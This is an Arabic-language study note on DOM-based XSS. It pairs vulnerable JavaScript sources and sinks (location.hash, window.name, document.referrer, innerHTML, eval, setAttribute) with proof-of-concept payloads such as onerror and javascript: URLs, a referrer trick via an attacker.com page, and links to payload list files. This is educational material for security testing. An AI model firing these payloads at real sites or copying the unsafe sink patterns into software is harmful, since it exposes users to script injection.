
## اول حاجه  انك تعرف المكان اللي بحط فيه ال input بياخذه باي function من الاتي 

### `location.hash`
###### شكلها في الكود : 
  ```javascript
  let userInput = location.hash.substr(1); // يأخذ الجزء بعد # (مثل payload)
  document.getElementById('content').innerHTML = userInput; // نقطة خطرة
  ```
- هنا، إذا كان الرابط `https://site.com#<script>alert(1)</script>`، فإن `userInput` يصبح `<script>alert(1)</script>`، ويتم إدخاله مباشرة في DOM، مما يؤدي إلى تنفيذ السكربت.
###### ازاي بحط ليها البايلود :
ضف الحمولة بعد `#` في الرابط:
    ```
    https://site.com/page#<img src=x onerror=alert(1)>
    ```
  - افتح الرابط في المتصفح وتحقق مما إذا تم تنفيذ الحمولة (مثل ظهور تنبيه).

#### الشرح العملي :

-------
###  `location.search `
###### شكلها في الكود : 
  ```javascript
  let query = location.search.substr(1); // يأخذ الجزء بعد ? (مثل key=payload)
  document.write(query); // نقطة خطرة
  ```
  - إذا كان الرابط `https://site.com?key=<script>alert(1)</script>`، فإن `query` يصبح `key=<script>alert(1)</script>`، وقد يتم كتابته مباشرة في DOM.


###### ازاي بحط ليها البايلود :
أضف الحمولة في معلمات الاستعلام:
    ```
    https://site.com/page?key=<img src=x onerror=alert(1)>
    ```
  - جرب معالجة المعلمات (مثل `key=payload`) وراقب ما إذا تم تنفيذ الحمولة.

#### الشرح العملي :

-------

### `document.URL`
###### شكلها في الكود : 
  ```javascript
  let url = document.URL;
  document.getElementById('output').innerHTML = url; // نقطة خطرة
  ```
  - إذا كان الرابط `https://site.com/page?test=<script>alert(1)</script>`، فإن `url` يحتوي على الحمولة، ويتم إدخالها في DOM.

###### ازاي بحط ليها البايلود :
 أضف الحمولة في أي جزء من الرابط (مثل الاستعلام أو الجزء):
    ```
    https://site.com/page?test=<img src=x onerror=alert(1)>
    ```
  - تحقق مما إذا تم تنفيذ الحمولة عند تحميل الصفحة.

#### الشرح العملي :

----
### `window.name`

###### شكلها في الكود : 
  ```javascript
  let name = window.name;
  document.write(name); // نقطة خطرة
  ```
  - إذا تم تعيين `window.name` إلى `<img src=x onerror=alert(1)>` في نافذة أخرى، فإنه يتم كتابته في DOM.

###### ازاي بحط ليها البايلود :
 1. افتح صفحة أخرى (أو علامة تبويب) ونفذ:
     ```javascript
     window.name = "<img src=x onerror=alert(1)>";
     ```
  2. انتقل إلى الصفحة المستهدفة:
     ```
     window.location = "https://site.com/page";
     ```
  3. تحقق مما إذا تم تنفيذ الحمولة.
#### الشرح العملي :

-----
### `document.referrer`

###### شكلها في الكود : 
```javascript
  let referrer = document.referrer;
  document.getElementById('output').innerHTML = referrer; // نقطة خطرة
```

###### ازاي بحط ليها البايلود :
  
1. أنشئ صفحة خبيثة تحتوي على رابط:
```javascript
<a href="https://site.com/page">Click</a>
```
2. استضف الصفحة على رابط يحتوي على الحمولة  (مثل `https://attacker.com/<img src=x onerror=alert(1)>` )

3. عندما ينقر المستخدم، يتم تمرير الحمولة عبر document.referrer.

#### الشرح العملي :

------
### `document.cookie`
###### شكلها في الكود : 
```javascript
let cookies = document.cookie;
document.getElementById('output').innerHTML = cookies; // نقطة خطرة
```
- - إذا تمكن المهاجم من التحكم في ملفات تعريف الارتباط (مثل عبر ثغرة أخرى)، يمكن حقن حمولة.
###### ازاي بحط ليها البايلود :
- تحتاج إلى ثغرة أخرى لتعديل document.cookie (مثل استغلال عبر موقع آخر).
- مثال: حقن 
```
document.cookie = "test="<img src=x onerror=alert(1)>";
```

#### الشرح العملي :

---
## ثاني حاجه اعرف ال function بتتنفذ ازاي (يعني بتستخدم اي  Sinks)
#### يعني اي ال  Sinks : 
النقاط الخطرة هي طرق أو خصائص DOM التي يمكن أن تنفذ تعليمات برمجية إذا تم تغذيتها بمدخلات غير موثوقة. دعني أشرح كل نقطة، شكلها في الكود، كيفية استغلالها، والحمولة المناسبة.


### `innerHTML`، `outerHTML`
###### شكلها في الكود : 
  ```javascript
  document.getElementById('content').innerHTML = location.hash.substr(1);
  ```
##### البايلود المناسب
هذه الخصائص تُدخل محتوى HTML مباشرة في DOM. الحمولات المناسبة هي تلك التي تحتوي على وسوم HTML (مثل `<script>`, `<img>`, `<div>`) مع أحداث (events) مثل `onerror` أو `onmouseover`، أو وسوم تفاعلية مثل `<svg>`.


![[Basic_payloads.txt]]


![[script_tag_payloads.txt]]


![[Event Handler Payloads.txt]]


![[svg_animation_payloads.txt]]


![[div_interactive_payloads.txt]]


![[Img_tag_payloads.txt]]


![[unique_tag.txt]]


![[Dom_payloads.txt]]


![[XSS_exploit_pyloads.txt]]



![[unicode_entity_payloads.txt]]



-----

### `document.write`، `document.writeln`

###### شكلها في الكود : 
 ```javascript
  document.write(location.search.substr(1));
  ```
##### البايلود المناسب
تكتب محتوى HTML مباشرة في الصفحة. الحمولات المناسبة تشبه تلك المستخدمة في innerHTML، مع التركيز على وسوم HTML أو سكربتات مباشرة.



![[Basic_payloads.txt]]


![[script_tag_payloads.txt]]


![[Event Handler Payloads.txt]]


![[svg_animation_payloads.txt]]


![[div_interactive_payloads.txt]]


![[Img_tag_payloads.txt]]


![[unique_tag.txt]]


![[Dom_payloads.txt]]


![[XSS_exploit_pyloads.txt]]



![[unicode_entity_payloads.txt]]


----
### `eval`، `setTimeout`، `setInterval`
###### شكلها في الكود : 
```javascript
 let code = location.hash.substr(1);
eval(code);
  ```
##### البايلود المناسب
تُنفذ نصوص JavaScript مباشرة كتعليمات برمجية. الحمولات المناسبة هي تعليمات JavaScript نقية (بدون وسوم HTML).



![[xss-without-alert-confirm-prompt.txt]]


![[xss-without-alert.txt]]


![[XSS_exploit_pyloads.txt]]



![[Dom_payloads.txt]]


![[with_out_Parentheses_bracket.txt]]


![[XSS_with_out_angle_bracket.txt]]

##### ملاحظة:
تجنب الحمولات التي تحتوي على وسوم HTML (مثل   `<script>`  لأن eval يتوقع تعليمات JavaScript نقية.



------
### `Element.setAttribute`

###### شكلها في الكود : 
```javascript
let input = location.hash.substr(1);
document.getElementById('img').setAttribute('onerror', input);
  ```

##### البايلود المناسب
تُعين سمات لعناصر DOM. إذا تم تعيين سمات مثل onerror أو href بمدخلات غير موثوقة، يمكن تنفيذ JavaScript.


![[Event Handler Payloads.txt]]




![[xss -for - attribute .txt]]




![[xss-without-alert-confirm-prompt.txt]]


![[xss-without-alert.txt]]


![[Dom_payloads.txt]]

#### ملاحظة:
:الحمولات يجب أن تكون تعليمات JavaScript نقية لـ onerror أو تعليمات صالحة للسمات (مثل `javascript:alert(1) `لـ href).

----
### `location.assign`، `window.location`
###### شكلها في الكود : 
```javascript
let url = location.hash.substr(1);
window.location = url;
```

##### البايلود المناسب
تُستخدم لإعادة توجيه المتصفح إلى رابط. الحمولات ==يجب أن تكون روابط أو تعليمات JavaScript== (مثل `javascript:alert(1)`).



![[xss-url.txt]]



![[xx redirect.txt]]


![[xss-without-alert-confirm-prompt.txt]]


![[xss-without-alert.txt]]


![[Dom_payloads.txt]]

------

